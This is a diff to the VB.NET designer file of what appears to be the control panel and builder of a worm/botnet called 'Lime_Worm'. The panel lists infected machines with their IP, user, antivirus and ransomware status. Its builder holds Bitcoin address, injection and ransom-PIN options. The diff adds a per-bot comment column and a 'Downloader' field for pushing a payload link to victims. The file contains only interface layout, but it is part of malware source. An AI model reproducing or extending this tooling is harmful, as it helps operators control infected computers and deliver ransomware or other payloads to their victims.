@@ -49,6 +49,8 @@ Partial Class Form1
         Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
+        Me.ToolStripSeparator3 = New System.Windows.Forms.ToolStripSeparator()
+        Me.CommentToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.BotColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
         Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
@@ -77,6 +79,7 @@ Partial Class Form1
         Me.Rans = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.USB = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.PING = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
+        Me.COMMENT = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.TabPage2 = New System.Windows.Forms.TabPage()
         Me.L2 = New System.Windows.Forms.ListBox()
         Me.TabPage3 = New System.Windows.Forms.TabPage()
@@ -86,6 +89,9 @@ Partial Class Form1
         Me.ChSeparator1 = New Server_0._5.CHSeparator()
         Me.ChButton1 = New Server_0._5.CHButton()
         Me.ChGroupBox3 = New Server_0._5.CHGroupBox()
+        Me.DWN_CHK = New Server_0._5.CHCheckbox()
+        Me.Label10 = New System.Windows.Forms.Label()
+        Me.DWN_LINK = New Server_0._5.CHTextbox()
         Me.PIN_CHK = New Server_0._5.CHCheckbox()
         Me.Label7 = New System.Windows.Forms.Label()
         Me.BTC_ADDR = New Server_0._5.CHTextbox()
@@ -129,10 +135,10 @@ Partial Class Form1
         Me.ContextMenuStrip1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
         Me.ContextMenuStrip1.DropShadowEnabled = False
         Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
-        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PluginsToolStripMenuItem, Me.ToolStripSeparator2, Me.RunAFileToolStripMenuItem, Me.VisitURLToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.ControllerOptionsToolStripMenuItem, Me.BotColorToolStripMenuItem, Me.ToolStripSeparator1, Me.AboutToolStripMenuItem})
+        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PluginsToolStripMenuItem, Me.ToolStripSeparator2, Me.RunAFileToolStripMenuItem, Me.VisitURLToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.ControllerOptionsToolStripMenuItem, Me.ToolStripSeparator3, Me.CommentToolStripMenuItem, Me.BotColorToolStripMenuItem, Me.ToolStripSeparator1, Me.AboutToolStripMenuItem})
         Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
         Me.ContextMenuStrip1.ShowImageMargin = False
-        Me.ContextMenuStrip1.Size = New System.Drawing.Size(178, 226)
+        Me.ContextMenuStrip1.Size = New System.Drawing.Size(178, 262)
         '
         'PluginsToolStripMenuItem
         '
@@ -307,6 +313,18 @@ Partial Class Form1
         Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
         Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
         Me.UninstallToolStripMenuItem.Text = "Uninstall"
+        '
+        'ToolStripSeparator3
+        '
+        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
+        Me.ToolStripSeparator3.Size = New System.Drawing.Size(174, 6)
+        '
+        'CommentToolStripMenuItem
+        '
+        Me.CommentToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
+        Me.CommentToolStripMenuItem.Name = "CommentToolStripMenuItem"
+        Me.CommentToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
+        Me.CommentToolStripMenuItem.Text = "Comment"
         '
         'BotColorToolStripMenuItem
         '
@@ -604,7 +622,7 @@ Partial Class Form1
         Me.MAIN_TAB.Location = New System.Drawing.Point(0, 0)
         Me.MAIN_TAB.Name = "MAIN_TAB"
         Me.MAIN_TAB.SelectedIndex = 0
-        Me.MAIN_TAB.Size = New System.Drawing.Size(1772, 516)
+        Me.MAIN_TAB.Size = New System.Drawing.Size(1895, 516)
         Me.MAIN_TAB.TabIndex = 0
         '
         'TabPage1
@@ -616,7 +634,7 @@ Partial Class Form1
         Me.TabPage1.Location = New System.Drawing.Point(4, 34)
         Me.TabPage1.Name = "TabPage1"
         Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
-        Me.TabPage1.Size = New System.Drawing.Size(1764, 478)
+        Me.TabPage1.Size = New System.Drawing.Size(1887, 478)
         Me.TabPage1.TabIndex = 0
         Me.TabPage1.Text = "Worms"
         '
@@ -625,7 +643,7 @@ Partial Class Form1
         Me.PictureBox1.BackColor = System.Drawing.Color.Black
         Me.PictureBox1.ErrorImage = Nothing
         Me.PictureBox1.InitialImage = Nothing
-        Me.PictureBox1.Location = New System.Drawing.Point(1509, 314)
+        Me.PictureBox1.Location = New System.Drawing.Point(1632, 314)
         Me.PictureBox1.Name = "PictureBox1"
         Me.PictureBox1.Size = New System.Drawing.Size(247, 128)
         Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
@@ -640,7 +658,7 @@ Partial Class Form1
         Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel3, Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel2})
         Me.StatusStrip1.Location = New System.Drawing.Point(3, 445)
         Me.StatusStrip1.Name = "StatusStrip1"
-        Me.StatusStrip1.Size = New System.Drawing.Size(1758, 30)
+        Me.StatusStrip1.Size = New System.Drawing.Size(1881, 30)
         Me.StatusStrip1.SizingGrip = False
         Me.StatusStrip1.TabIndex = 1
         Me.StatusStrip1.Text = "StatusStrip1"
@@ -649,8 +667,8 @@ Partial Class Form1
         '
         Me.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.Lime
         Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
-        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(24, 25)
-        Me.ToolStripStatusLabel3.Text = "..."
+        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(184, 25)
+        Me.ToolStripStatusLabel3.Text = "Checking connection.."
         '
         'ToolStripStatusLabel1
         '
@@ -671,7 +689,7 @@ Partial Class Form1
         Me.L1.AutoArrange = False
         Me.L1.BackColor = System.Drawing.Color.Black
         Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
-        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USER, Me.EXE_NAME, Me.VER, Me.OS, Me.INDATE, Me.AV, Me.Rans, Me.USB, Me.PING})
+        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USER, Me.EXE_NAME, Me.VER, Me.OS, Me.INDATE, Me.AV, Me.Rans, Me.USB, Me.PING, Me.COMMENT})
         Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
         Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
         Me.L1.ForeColor = System.Drawing.Color.Lime
@@ -679,7 +697,7 @@ Partial Class Form1
         Me.L1.Location = New System.Drawing.Point(3, 3)
         Me.L1.Name = "L1"
         Me.L1.OwnerDraw = True
-        Me.L1.Size = New System.Drawing.Size(1758, 472)
+        Me.L1.Size = New System.Drawing.Size(1881, 472)
         Me.L1.SmallImageList = Me.Flag
         Me.L1.TabIndex = 0
         Me.L1.UseCompatibleStateImageBehavior = False
@@ -739,6 +757,10 @@ Partial Class Form1
         '
         Me.PING.Text = " Ping "
         '
+        'COMMENT
+        '
+        Me.COMMENT.Text = " Comment "
+        '
         'TabPage2
         '
         Me.TabPage2.BackColor = System.Drawing.Color.Black
@@ -746,7 +768,7 @@ Partial Class Form1
         Me.TabPage2.Location = New System.Drawing.Point(4, 34)
         Me.TabPage2.Name = "TabPage2"
         Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
-        Me.TabPage2.Size = New System.Drawing.Size(1764, 478)
+        Me.TabPage2.Size = New System.Drawing.Size(1887, 478)
         Me.TabPage2.TabIndex = 1
         Me.TabPage2.Text = "Logs"
         '
@@ -763,7 +785,7 @@ Partial Class Form1
         Me.L2.Items.AddRange(New Object() {"#Lime_Worm"})
         Me.L2.Location = New System.Drawing.Point(3, 3)
         Me.L2.Name = "L2"
-        Me.L2.Size = New System.Drawing.Size(1758, 472)
+        Me.L2.Size = New System.Drawing.Size(1881, 472)
         Me.L2.TabIndex = 0
         '
         'TabPage3
@@ -777,7 +799,7 @@ Partial Class Form1
         Me.TabPage3.Controls.Add(Me.ChGroupBox1)
         Me.TabPage3.Location = New System.Drawing.Point(4, 34)
         Me.TabPage3.Name = "TabPage3"
-        Me.TabPage3.Size = New System.Drawing.Size(1764, 478)
+        Me.TabPage3.Size = New System.Drawing.Size(1887, 478)
         Me.TabPage3.TabIndex = 2
         Me.TabPage3.Text = "Builder"
         '
@@ -795,7 +817,7 @@ Partial Class Form1
         Me.ChGroupBox4.Name = "ChGroupBox4"
         Me.ChGroupBox4.NoRounding = False
         Me.ChGroupBox4.Sizable = True
-        Me.ChGroupBox4.Size = New System.Drawing.Size(169, 286)
+        Me.ChGroupBox4.Size = New System.Drawing.Size(169, 348)
         Me.ChGroupBox4.SmartBounds = True
         Me.ChGroupBox4.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox4.TabIndex = 10
@@ -830,7 +852,7 @@ Partial Class Form1
         Me.ChSeparator1.Customization = ""
         Me.ChSeparator1.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.ChSeparator1.Image = Nothing
-        Me.ChSeparator1.Location = New System.Drawing.Point(25, 438)
+        Me.ChSeparator1.Location = New System.Drawing.Point(25, 452)
         Me.ChSeparator1.Name = "ChSeparator1"
         Me.ChSeparator1.NoRounding = False
         Me.ChSeparator1.Size = New System.Drawing.Size(1383, 23)
@@ -843,7 +865,7 @@ Partial Class Form1
         Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
         Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
         Me.ChButton1.Image = Nothing
-        Me.ChButton1.Location = New System.Drawing.Point(25, 366)
+        Me.ChButton1.Location = New System.Drawing.Point(25, 392)
         Me.ChButton1.Name = "ChButton1"
         Me.ChButton1.NoRounding = False
         Me.ChButton1.Size = New System.Drawing.Size(1383, 54)
@@ -855,6 +877,9 @@ Partial Class Form1
         '
         Me.ChGroupBox3.BackColor = System.Drawing.Color.Black
         Me.ChGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.ChGroupBox3.Controls.Add(Me.DWN_CHK)
+        Me.ChGroupBox3.Controls.Add(Me.Label10)
+        Me.ChGroupBox3.Controls.Add(Me.DWN_LINK)
         Me.ChGroupBox3.Controls.Add(Me.PIN_CHK)
         Me.ChGroupBox3.Controls.Add(Me.Label7)
         Me.ChGroupBox3.Controls.Add(Me.BTC_ADDR)
@@ -868,13 +893,53 @@ Partial Class Form1
         Me.ChGroupBox3.Name = "ChGroupBox3"
         Me.ChGroupBox3.NoRounding = False
         Me.ChGroupBox3.Sizable = True
-        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 286)
+        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 348)
         Me.ChGroupBox3.SmartBounds = True
         Me.ChGroupBox3.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox3.TabIndex = 7
         Me.ChGroupBox3.Text = "MISC"
         Me.ChGroupBox3.TransparencyKey = System.Drawing.Color.Empty
         Me.ChGroupBox3.Transparent = False
+        '
+        'DWN_CHK
+        '
+        Me.DWN_CHK.BackColor = System.Drawing.Color.Transparent
+        Me.DWN_CHK.Checked = False
+        Me.DWN_CHK.ForeColor = System.Drawing.Color.Black
+        Me.DWN_CHK.Location = New System.Drawing.Point(277, 271)
+        Me.DWN_CHK.Name = "DWN_CHK"
+        Me.DWN_CHK.Size = New System.Drawing.Size(77, 14)
+        Me.DWN_CHK.TabIndex = 13
+        Me.DWN_CHK.Text = "Once"
+        '
+        'Label10
+        '
+        Me.Label10.AutoSize = True
+        Me.Label10.BackColor = System.Drawing.Color.Black
+        Me.Label10.ForeColor = System.Drawing.Color.Lime
+        Me.Label10.Location = New System.Drawing.Point(16, 267)
+        Me.Label10.Name = "Label10"
+        Me.Label10.Size = New System.Drawing.Size(104, 18)
+        Me.Label10.TabIndex = 12
+        Me.Label10.Text = "Downloader"
+        '
+        'DWN_LINK
+        '
+        Me.DWN_LINK.BackColor = System.Drawing.Color.Transparent
+        Me.DWN_LINK.Colors = New Server_0._5.Bloom(-1) {}
+        Me.DWN_LINK.Customization = ""
+        Me.DWN_LINK.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "DWN", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
+        Me.DWN_LINK.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.DWN_LINK.Image = Nothing
+        Me.DWN_LINK.Location = New System.Drawing.Point(19, 297)
+        Me.DWN_LINK.MaxCharacters = 0
+        Me.DWN_LINK.Name = "DWN_LINK"
+        Me.DWN_LINK.NoRounding = False
+        Me.DWN_LINK.Size = New System.Drawing.Size(335, 25)
+        Me.DWN_LINK.TabIndex = 11
+        Me.DWN_LINK.Text = Global.Server_0._5.My.MySettings.Default.DWN
+        Me.DWN_LINK.Transparent = True
+        Me.DWN_LINK.UsePasswordMask = False
         '
         'PIN_CHK
         '
@@ -960,7 +1025,7 @@ Partial Class Form1
         Me.ChGroupBox2.Name = "ChGroupBox2"
         Me.ChGroupBox2.NoRounding = False
         Me.ChGroupBox2.Sizable = True
-        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 286)
+        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 348)
         Me.ChGroupBox2.SmartBounds = True
         Me.ChGroupBox2.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox2.TabIndex = 5
@@ -1117,7 +1182,7 @@ Partial Class Form1
         Me.ChGroupBox1.Name = "ChGroupBox1"
         Me.ChGroupBox1.NoRounding = False
         Me.ChGroupBox1.Sizable = True
-        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 286)
+        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 348)
         Me.ChGroupBox1.SmartBounds = True
         Me.ChGroupBox1.StartPosition = System.Windows.Forms.FormStartPosition.Manual
         Me.ChGroupBox1.TabIndex = 4
@@ -1142,7 +1207,7 @@ Partial Class Form1
         '
         Me.Label9.AutoSize = True
         Me.Label9.ForeColor = System.Drawing.Color.Lime
-        Me.Label9.Location = New System.Drawing.Point(16, 154)
+        Me.Label9.Location = New System.Drawing.Point(16, 201)
         Me.Label9.Name = "Label9"
         Me.Label9.Size = New System.Drawing.Size(148, 18)
         Me.Label9.TabIndex = 5
@@ -1152,7 +1217,7 @@ Partial Class Form1
         '
         Me.Label6.AutoSize = True
         Me.Label6.ForeColor = System.Drawing.SystemColors.Control
-        Me.Label6.Location = New System.Drawing.Point(16, 180)
+        Me.Label6.Location = New System.Drawing.Point(16, 227)
         Me.Label6.Name = "Label6"
         Me.Label6.Size = New System.Drawing.Size(133, 18)
         Me.Label6.TabIndex = 3
@@ -1162,7 +1227,7 @@ Partial Class Form1
         '
         Me.Label2.AutoSize = True
         Me.Label2.ForeColor = System.Drawing.Color.Lime
-        Me.Label2.Location = New System.Drawing.Point(16, 130)
+        Me.Label2.Location = New System.Drawing.Point(16, 177)
         Me.Label2.Name = "Label2"
         Me.Label2.Size = New System.Drawing.Size(84, 18)
         Me.Label2.TabIndex = 2
@@ -1201,7 +1266,7 @@ Partial Class Form1
         Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
         Me.BackColor = System.Drawing.Color.Black
-        Me.ClientSize = New System.Drawing.Size(1772, 516)
+        Me.ClientSize = New System.Drawing.Size(1895, 516)
         Me.Controls.Add(Me.MAIN_TAB)
         Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
         Me.Name = "Form1"
@@ -1312,4 +1377,10 @@ Partial Class Form1
     Friend WithEvents Label8 As Label
     Friend WithEvents Injection_CHK As CHCheckbox
     Friend WithEvents VisitURLToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents COMMENT As ColumnHeader
+    Friend WithEvents CommentToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents ToolStripSeparator3 As ToolStripSeparator
+    Friend WithEvents Label10 As Label
+    Friend WithEvents DWN_LINK As CHTextbox
+    Friend WithEvents DWN_CHK As CHCheckbox
 End Class
